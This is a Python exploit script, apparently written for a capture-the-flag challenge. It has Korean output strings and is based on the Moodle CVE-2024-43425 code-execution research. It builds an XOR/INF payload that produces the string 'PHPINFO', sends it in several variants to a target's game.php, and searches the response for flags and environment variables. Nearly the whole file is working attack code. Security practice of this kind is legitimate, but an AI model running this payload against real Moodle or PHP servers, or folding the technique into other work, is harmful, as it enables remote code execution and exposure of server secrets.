#!/usr/bin/env python3
"""
Advanced Calculator - XOR String Generation Exploit
Based on Moodle CVE-2024-43425 vulnerability

This exploit demonstrates how to use XOR operations with INF values
to generate arbitrary strings for variable function calls.
"""

import requests
import sys
import re
from urllib.parse import quote

def banner():
    print("🔥 " + "="*60)
    print("    Advanced Calculator - XOR Exploit")
    print("    CVE-2024-43425 기반 Variable Functions 공격")
    print("="*64)
    print()

def generate_xor_payload():
    """
    Generate XOR payload to create 'PHPINFO' string using INF values
    Based on original research: https://blog.redteam-pentesting.de/2024/moodle-rce/
    """
    # exp(1000) generates INF string
    # Use XOR operations to combine INF with numbers to create target string
    
    # Original payload from the research paper
    payload = "((exp(1000) . 0+exp(1000) . 0+exp(1000)) ^ (4 . 2 . 3 . 0 . 0 . 0 . 0) ^ (0 . 0 . 0 . 0 . 0 . 0 . 0) ^ (0 . 0 . -1 . 1 . 1 . 4) ^ (-4 . 8 . 1 . 1 . 1 . 2))"
    
    return payload

def exploit_xor_method(url):
    """
    Exploit using XOR string generation method
    """
    print("🧮 XOR 문자열 생성 방법으로 공격 시도")
    
    # Generate the XOR payload for PHPINFO
    xor_string = generate_xor_payload()
    
    # Create variable function call
    payloads = [
        f"{xor_string}{{INFO_ALL}}",
        f"{xor_string}{{1}}",
        f"({xor_string}){{1}}",
    ]
    
    for payload in payloads:
        print(f"   시도 중: {payload[:50]}...")
        try:
            response = requests.get(f"{url}/game.php", 
                                  params={"f": payload}, 
                                  timeout=10)
            
            if response.status_code == 200:
                if "PHP Version" in response.text or "phpinfo()" in response.text:
                    print("✅ XOR 공격 성공!")
                    return response.text, payload
                elif "DH{" in response.text:
                    print("🎉 플래그 발견!")
                    flag_match = re.search(r'DH\{[^}]+\}', response.text)
                    if flag_match:
                        print(f"🚩 플래그: {flag_match.group()}")
                        return response.text, payload
                else:
                    print("   결과 확인 중...")
                    # Check if we got some output that might contain flag
                    if len(response.text) > 1000:  # Long response might be phpinfo
                        return response.text, payload
                        
        except Exception as e:
            print(f"   오류: {str(e)}")
    
    return None, None

def search_flag(response_text):
    """
    Search for flag in response
    """
    flag_patterns = [
        r'DH\{[^}]+\}',
        r'FLAG[^<\s]*DH\{[^}]+\}',
        r'YBG\{[^}]+\}',
    ]
    
    for pattern in flag_patterns:
        matches = re.findall(pattern, response_text)
        if matches:
            return matches
    
    return []

def main():
    banner()
    
    # URL 설정
    if len(sys.argv) >= 3:
        url = f"http://{sys.argv[1]}:{sys.argv[2]}"
        print(f"🌐 원격 서버 모드: {url}")
    else:
        url = "http://localhost:10001"
        print(f"🏠 로컬 서버 모드: {url}")
    
    print()
    
    print("=" * 50)
    print("XOR 문자열 생성을 이용한 Variable Functions 공격")
    print("=" * 50)
    
    response_text, successful_payload = exploit_xor_method(url)
    
    if response_text:
        print(f"✅ 성공한 페이로드: {successful_payload[:100]}...")
        flags = search_flag(response_text)
        
        if flags:
            print("\n🎉 플래그 발견!")
            for flag in flags:
                print(f"🚩 {flag}")
        else:
            print("\n🔍 응답 분석 중...")
            # Look for environment variables section
            if "Environment" in response_text or "FLAG" in response_text:
                print("환경변수 관련 내용 발견!")
                # Extract relevant parts
                lines = response_text.split('\n')
                for i, line in enumerate(lines):
                    if 'FLAG' in line or 'DH{' in line:
                        print(f"라인 {i}: {line.strip()}")
            else:
                print("phpinfo 출력을 확인하세요.")
    else:
        print("\n❌ 공격이 실패했습니다.")
        print("💡 디버깅 힌트:")
        print("   1. 서버가 정상적으로 실행 중인지 확인")
        print("   2. Moodle 코드가 정확히 구현되었는지 확인")
        print("   3. XOR 페이로드가 올바른지 확인")
        print("   4. Variable Functions가 활성화되어 있는지 확인")

if __name__ == "__main__":
    main()
